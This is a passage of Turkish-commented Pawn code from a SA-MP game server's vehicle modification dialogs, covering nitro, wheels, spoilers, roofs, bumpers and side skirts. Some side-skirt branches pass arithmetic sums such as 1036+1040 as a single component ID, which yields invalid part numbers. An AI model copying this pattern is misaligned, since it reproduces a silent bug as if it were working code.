		        case 11: ShowPlayerDialog(playerid,DIALOG_HIDROLIK,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","Hidrolikler","Seç","Çýkýþ");
		        case 12: ShowPlayerDialog(playerid,DIALOG_NITRO,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","2x Nitro\n5x Nitro\n10x Nitro","Seç","Çýkýþ");
	        }
	    }
	    else
	    {
		}
	    return 1;
	}
	if(dialogid == DIALOG_NITRO){
	    if(response){ //dur þimdi þurda az iþim var
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	        SetPVarInt(playerid, "ModifiyeNe", 12);
	        if(listitem == 0){
	            AddVehicleComponent(GetPlayerVehicleID(playerid), 1008);
	            Onizlemede[playerid] = 1008;
	        }
	        if(listitem == 1){
	            AddVehicleComponent(GetPlayerVehicleID(playerid),1009);
	            Onizlemede[playerid] = 1009;
	        }
	        if(listitem == 2){
	            AddVehicleComponent(GetPlayerVehicleID(playerid),1010);
				Onizlemede[playerid] = 1010;
	        }
			Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
	    }//responseyi kapatýyo bu eleman da
	    else // þunlar elsei moruk
		{
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	}//dialogu kapatýyo
	if(dialogid == DIALOG_HIDROLIK){
	    if(response){
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	        SetPVarInt(playerid, "ModifiyeNe", 11);
	        if(listitem == 0){
	            AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);
	            Onizlemede[playerid] = 1087;
	        }//listitem 0ý kapatýr
			Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
	    } //responseyi kapatýr
	    else //if response elsesi
		{
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	}//dialogu kapatýr
	if(dialogid == DIALOG_SESSISTEMI){
	    if(response){
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	        SetPVarInt(playerid, "ModifiyeNe", 10);
	        if(listitem == 0){
	            AddVehicleComponent(GetPlayerVehicleID(playerid), 1086);
	            Onizlemede[playerid] = 1086;
	        }//listitem 0ý kapatýr
			Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
		}//responseyi kapatýr
	    else //if response elsesi
		{
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	}//dialogu kapatýr
	if(dialogid == DIALOG_TEKERLEK){
	    if(response){
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	        SetPVarInt(playerid, "ModifiyeNe", 9);
	        switch(listitem){
	            case 0:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1025);
	                Onizlemede[playerid] = 1025;
	            }
	            case 1:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid), 1074);
	                Onizlemede[playerid] = 1074;
	            }
	            case 2:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1076);
	                Onizlemede[playerid] = 1076;
	            }
	            case 3:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1078);
	                Onizlemede[playerid] = 1078;
	            }
	            case 4:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1081);
	                Onizlemede[playerid] = 1081;
	            }
	            case 5:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1082);
	                Onizlemede[playerid] = 1082;
	            }
	            case 6:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1085);
	                Onizlemede[playerid]= 1085;
	            }
	            case 7:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1096);
	                Onizlemede[playerid] = 1096;
	            }
	            case 8:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1097);
	                Onizlemede[playerid] = 1097;
	            }
	            case 9:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1098);
	                Onizlemede[playerid] = 1098;
	            }
	            case 10:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1084);
	                Onizlemede[playerid] = 1084;
	            }
	            case 11:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1073);
	                Onizlemede[playerid] = 1073;
	            }
	            case 12:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1075);
	                Onizlemede[playerid] = 1075;
	            }
	            case 13:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1077);
	                Onizlemede[playerid] = 1077;
	            }
	            case 14:{
		            AddVehicleComponent(GetPlayerVehicleID(playerid),1079);
		            Onizlemede[playerid] = 1079;
	            }
	            case 15:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1080);
	                Onizlemede[playerid] = 1080;
	            }
	            case 16:{
	                AddVehicleComponent(GetPlayerVehicleID(playerid),1083);
	                Onizlemede[playerid] = 1083;
	            }
	        }//switch listitemi kapatýr
			Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
	    }//responseyi kapatýr
	    else //if response elsesi
		{
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	}//dialogu kapatýr
	if(dialogid == DIALOG_FARLAR){
	    if(response){
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	        new modelid = GetVehicleModel(Modifiyede[playerid]);
	        SetPVarInt(playerid, "ModifiyeNe", 8);
	        switch(listitem){
	            case 0,1,2:{
	                if(modelid == 534){
	                    if(listitem == 0){
	                        AddVehicleComponent(GetPlayerVehicleID(playerid), 1100);
							Onizlemede[playerid] = 1100;
						}
						else if(listitem == 1){
						    AddVehicleComponent(GetPlayerVehicleID(playerid),1123);
						    Onizlemede[playerid] = 1123;
						}
						else if(listitem == 2){
						    AddVehicleComponent(GetPlayerVehicleID(playerid),1125);
						    Onizlemede[playerid] = 1125;
						}
	                }//modelid 534ü kapatýr
	   				else{
				  		ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
				  		Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
				  		return 1;
					}
					Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
	            }//case 0,1,2yi kapatýr
	            case 3:{
	                if(modelid == 535){
	                    AddVehicleComponent(GetPlayerVehicleID(playerid), 1117);
	                    Onizlemede[playerid] = 1117;
	                }//modelid 535ü kapatýr
	   				else{
				  		ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
				  		Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
				  		return 1;
					}
	            }//case 3ü kapatýr
	        }//switch listitemi kapatýr
	    }//responseyi kapatýr
	}//dialogu kapatýr
	if(dialogid == DIALOG_YANKENAR){
	    if(response){
	        Modifiyede[playerid] = GetPlayerVehicleID(playerid);
	        new modelid = GetVehicleModel(Modifiyede[playerid]);
	        SetPVarInt(playerid, "ModifiyeNe", 7);
			switch(listitem){
			    case 0,1:{
				    if(modelid == 562 || modelid == 565 || modelid == 559 || modelid == 561 || modelid == 560 || modelid == 558){
						if(listitem == 0){
						    switch(modelid){
						        case 562:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1036+1040);
						            Onizlemede[playerid] = 1036+1040;
						        }
						        case 565:{
						           	AddVehicleComponent(GetPlayerVehicleID(playerid),1047+1051);
						            Onizlemede[playerid] = 1047+1051;
						        }
						        case 559:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1069+1071);
						            Onizlemede[playerid] = 1069+1071;
						        }
						        case 561:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1056+1062);
						            Onizlemede[playerid] = 1056+1062;
						        }
						        case 560:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1026+1027);
						            Onizlemede[playerid] = 1026+1027;
						        }
						        case 558:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1090+1094);
						            Onizlemede[playerid] = 1090+1094;
						        }
						    }//listitem 0 sonrasý switch modelidyi kapatýr
						}//listitem 0ý kapatýr
						else if(listitem == 1){
						    switch(modelid){
						        case 562:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1039+1041);
						            Onizlemede[playerid] = 1039+1041;
						        }
						        case 565:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1048+1052);
                                    Onizlemede[playerid] = 1048+1052;
								}
								case 559:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1070+1072);
                                    Onizlemede[playerid] = 1070+1072;
								}
								case 561:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1057+1063);
								    Onizlemede[playerid] = 1057+1063;
								}
								case 560:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1031+1030);
								    Onizlemede[playerid] = 1031+1030;
								}
								case 558:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1093+1095);
								    Onizlemede[playerid] = 1093+1095;
								}
						    }//listitem 1 sonrasý switch modelidyi kapatýr
						}//listitem 1i kapatýr
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
	    			}//modelid 562,565,559,561,560,558i kapatýr
	   				else{
				  		ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
				  		Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
				  		return 1;
					}
				}//case 0,1i kapatýr
				case 2:{
				    if(modelid == 575 || modelid == 536 || modelid == 576 || modelid == 567){
				        switch(modelid){
				            case 575:{
                                AddVehicleComponent(GetPlayerVehicleID(playerid),1042+1099);
                                Onizlemede[playerid] = 1042+1099;
				            }
				            case 536:{
				                AddVehicleComponent(GetPlayerVehicleID(playerid),1102+1133);
				                Onizlemede[playerid] = 1102+1133;
				            }
				            case 576:{
				                AddVehicleComponent(GetPlayerVehicleID(playerid),1134+1137);
				                Onizlemede[playerid] = 1134+1137;
				            }
				            case 567:{
				                AddVehicleComponent(GetPlayerVehicleID(playerid),1108+1107);
				                Onizlemede[playerid] = 1108+1107;
				            }
						}//switch modelidyi kapatýr
				    }//modelid 575,536,576,567yi kapatýr
	   				else{
				  		ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
				  		Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
				  		return 1;
					}
				}//case 2yi kapatýr
				case 3,4:{
				    if(modelid == 534){
				        if(listitem == 3){
							AddVehicleComponent(GetPlayerVehicleID(playerid),1122+1101);
							Onizlemede[playerid] = 1122+1101;
						}
						else if(listitem == 4){
						    AddVehicleComponent(GetPlayerVehicleID(playerid),1106+1024);
						    Onizlemede[playerid] = 1106+1024;
						}//listitem 4ü kapatýr else if olaný
				    }//modelid 534ü kapatýr
	   				else{
				  		ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
				  		Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
				  		return 1;
					}
					Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
				}//case 3,4ü kapatýr
				case 5,6:{
				    if(modelid == 535){
						if(listitem == 5){
						    AddVehicleComponent(GetPlayerVehicleID(playerid),1118+1120);
						    Onizlemede[playerid] = 1118+1120;
						}
						else if(listitem == 6){
						    AddVehicleComponent(GetPlayerVehicleID(playerid),1119+1121);
						    Onizlemede[playerid] = 1119+1121;
						}
				    }//modelid 535i kapatýr
	   				else{
				  		ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
				  		Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
				  		return 1;
					}
					Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
				}//case 5,6yý kapatýr
			}//switch listitemi kapatýr
	    }//responseyi kapatir
	    else //if response elsesi
		{
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	    return 1;
	}//dialogu kapatýr
	if(dialogid == DIALOG_SPOILER){
		if(response){
		    Modifiyede[playerid] = GetPlayerVehicleID(playerid);
		    new modelid = GetVehicleModel(Modifiyede[playerid]);
		    SetPVarInt(playerid, "ModifiyeNe", 6);
			if(modelid == 562 || modelid == 565 || modelid == 559 || modelid == 561 || modelid == 560 || modelid == 558){
			    if(listitem == 0){
			        switch(modelid){
				        case 562:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1147);
				            Onizlemede[playerid] = 1147;
				        }
				        case 565:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1149);
				            Onizlemede[playerid] = 1149;
				        }
				        case 559:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1162);
				            Onizlemede[playerid] = 1162;
				        }
				        case 561:{
	                        AddVehicleComponent(GetPlayerVehicleID(playerid),1158);
	                        Onizlemede[playerid] = 1158;
						}
						case 560:{
						    AddVehicleComponent(GetPlayerVehicleID(playerid),1138);
						    Onizlemede[playerid] = 1138;
						}
						case 558:{
						    AddVehicleComponent(GetPlayerVehicleID(playerid),1164);
						    Onizlemede[playerid] = 1164;
						}
					}//switch modelidyi kapatýr
				}//listitem 0ý kapatýr
				else if(listitem == 1){
				    switch(modelid){
				        case 562:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1146);
				            Onizlemede[playerid] = 1146;
				        }
				        case 565:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1150);
				            Onizlemede[playerid] = 1150;
				        }
				        case 559:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1158);
				            Onizlemede[playerid] = 1158;
				        }
				        case 561:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1060);
				            Onizlemede[playerid] = 1060;
				        }
				        case 560:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1139);
				            Onizlemede[playerid] = 1139;
				        }
				        case 558:{
				            AddVehicleComponent(GetPlayerVehicleID(playerid),1163);
				            Onizlemede[playerid] = 1163;
				        }
	    			}//listitem 1 sonrasý modelidyi kapatýr
				}//listitem 1i kapatýr
				Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
			}//modelid 562, 565, 559 ile devam edeni kapatýr
   			else{
		  		ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		return 1;
			}
		}//responseyi kapatýr
	    else //if response elsesi
		{
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
		return 1;
	}//dialogu kapatýr

  	if(dialogid == DIALOG_TEPE){
	    if(response){
			Modifiyede[playerid] = GetPlayerVehicleID(playerid);
			new modelid = GetVehicleModel(Modifiyede[playerid]);
			SetPVarInt(playerid, "ModifiyeNe", 5);
			switch(listitem){
			    case 0,1:{
			        if(modelid == 562 || modelid == 565 || modelid == 559 || modelid == 561 || modelid == 560 || modelid == 558){
						if(listitem == 0){
						    switch(modelid){
								case 562:{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1035);
									Onizlemede[playerid] = 1035;
								}
								case 565:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1054);
								    Onizlemede[playerid] = 1054;
								}
								case 559:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1067);
								    Onizlemede[playerid] = 1067;
								}
								case 561:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1055);
								    Onizlemede[playerid] = 1055;
								}
								case 560:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1032);
								    Onizlemede[playerid] = 1032;
								}
								case 558:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1088);
								    Onizlemede[playerid] = 1088;
								}
						    }//switch modelidyi kapatýr listitem 0dan sonraki
						}//listitem 0ý kapatýr
						else if(listitem == 1){
						    switch(modelid){
						        case 562:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1035);
						            Onizlemede[playerid] = 1035;
						        }
						        case 565:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1053);
						            Onizlemede[playerid] = 1053;
						        }
						        case 559:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1068);
						            Onizlemede[playerid] = 1068;
						        }
						        case 561:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1061);
						            Onizlemede[playerid] = 1061;
						        }
						        case 560:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1033);
						            Onizlemede[playerid] = 1033;
						        }
						        case 558:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1091);
						            Onizlemede[playerid] = 1091;
						        }
						    }//switch modelidyi kapatýr listitem 1den sonraki
						}//listitem 1i kapatýr
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
					}//modelid 562, 565, 559u kapatýr
		  		    else{
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
			    }//case 0,1i kapatýr
			    case 2,3:{
					if(modelid == 567 || modelid == 536){
					    if(listitem == 2){
					        switch(modelid){
					            case 567:{
									AddVehicleComponent(GetPlayerVehicleID(playerid),1130);
									Onizlemede[playerid] = 1130;
								}
								case 536:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1128);
								    Onizlemede[playerid] = 1128;
								}
					        }//listitem2 sonrasý switch modelidyi kapatýr
					    }//listitem2yi kapatýr
					    else if(listitem == 3){
					        switch(modelid){
					            case 567:{
					                AddVehicleComponent(GetPlayerVehicleID(playerid),1131);
					                Onizlemede[playerid] = 1131;
					            }
					            case 536:{
					                AddVehicleComponent(GetPlayerVehicleID(playerid),1103);
					                Onizlemede[playerid] = 1103;
					            }
					        }//listitem 3 sonrasý switch modelidyi kapatýr
					    }//listitem3ü kapatýr
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
					}//modelid 567-536yý kapatýr
		  		    else{
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
			    }//case 2,3ü kapatýr
			}//switch listitemi kapatýr
	    }//responseyi kapatýr
	    else //if response elsesi
	    {
			if(GetPlayerVehicleModel(playerid) == 525) ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk","Seç","Çýkýþ");
			else ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
	    }
	    return 1;
	}//dialogu kapatýr
	if(dialogid == DIALOG_ARKATAMPON){
		if(response){
		    Modifiyede[playerid] = GetPlayerVehicleID(playerid);
		    new modelid = GetVehicleModel(Modifiyede[playerid]);
		    SetPVarInt(playerid, "ModifiyeNe", 4);
		    switch(listitem){
		        case 0,1:{
		            if(modelid == 562 || modelid == 565 || modelid == 559 || modelid == 561 || modelid == 560 || modelid == 558){
		                if(listitem == 0){
		                    switch(modelid){
		                        case 562:{
									AddVehicleComponent(GetPlayerVehicleID(playerid), 1149);
									Onizlemede[playerid] = 1149;
								}
								case 565:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1150);
                                    Onizlemede[playerid] = 1150;
								}
								case 559:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1159);
                                    Onizlemede[playerid] = 1159;
								}
								case 561:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1154);
                                    Onizlemede[playerid] = 1154;
								}
								case 560:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1141);
								    Onizlemede[playerid] = 1141;
								}
								case 558:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1168);
                                    Onizlemede[playerid] = 1168;
								}
		                    }//listitem0dan sonraki switch modelidyi kapatýr
		                }//listitem 0ý kapatýr
		                else if(listitem == 1){
		                    switch(modelid){
		                        case 562:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1148);
                                    Onizlemede[playerid] = 1148;
								}
								case 565:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1151);
                                    Onizlemede[playerid] = 1151;
								}
								case 559:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1161);
								    Onizlemede[playerid] = 1161;
								}
								case 561:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1156);
								    Onizlemede[playerid] = 1156;
								}
								case 560:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1140);
                                    Onizlemede[playerid] = 1140;
								}
								case 558:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1167);
								    Onizlemede[playerid] = 1167;
								}
		                    }//listitem1den sonraki modelidyi kapatýr
		                }//listitem 1i kapatýr
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
		            }//modelid 562,565,559,561ile baþlayaný kapatýr
		  		    else{
		  		        ShowPlayerDialog(playerid,830,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","{FFFFFF}Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro","Seç","Çýkýþ");
		  		        Hata(playerid, "Bu araca bu parçayý takamazsýnýz.");
		  		        return 1;
					}
		        }//case 0,1i kapatýr
		        case 2,3:{
		            if(modelid == 575 || modelid == 534 || modelid == 567 || modelid == 536 || modelid == 576 || modelid == 535){
		                if(listitem == 2){
		                    switch(modelid){
		                        case 575:{
									AddVehicleComponent(GetPlayerVehicleID(playerid), 1176);
									Onizlemede[playerid] = 1176;
		                        }
		                        case 534:{
		                            AddVehicleComponent(GetPlayerVehicleID(playerid),1180);
		                            Onizlemede[playerid] = 1180;
		                        }
		                        case 567:{
                                    AddVehicleComponent(GetPlayerVehicleID(playerid),1187);
                                    Onizlemede[playerid] = 1187;
								}
								case 536:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1184);
								    Onizlemede[playerid] = 1184;
								}
								case 576:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1192);
								    Onizlemede[playerid] = 1192;
								}
								case 535:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1109);
								    Onizlemede[playerid] = 1109;
								}
							}//listitem2den sonraki modelidyi kapatýr switch olan
						}//listitem 2yi kapatýr
						else if(listitem == 3){
						    switch(modelid){
						        case 575:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1177);
						            Onizlemede[playerid] = 1177;
						        }
						        case 534:{
						            AddVehicleComponent(GetPlayerVehicleID(playerid),1178);
						            Onizlemede[playerid] = 1178;
						        }
								case 567:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1186);
								    Onizlemede[playerid] = 1186;
								}
								case 536:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1183);
								    Onizlemede[playerid] = 1183;
								}
								case 576:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1193);
								    Onizlemede[playerid] = 1193;
								}
								case 535:{
								    AddVehicleComponent(GetPlayerVehicleID(playerid),1110);
								    Onizlemede[playerid] = 1110;
								}
						    }//switch modelidyi kapatýyor
						}//listitem 3ü kapatýyor
						Bilgi(playerid, "Modifiyeyi önizliyorsunuz. Önizlemeden çýkmak için '/onizlecik'. Satýn almak için '/modifiyeal'.");
					}//modelid 575,534,567 ile baþlayaný ve devam edeni kapatýr
		  		    else{
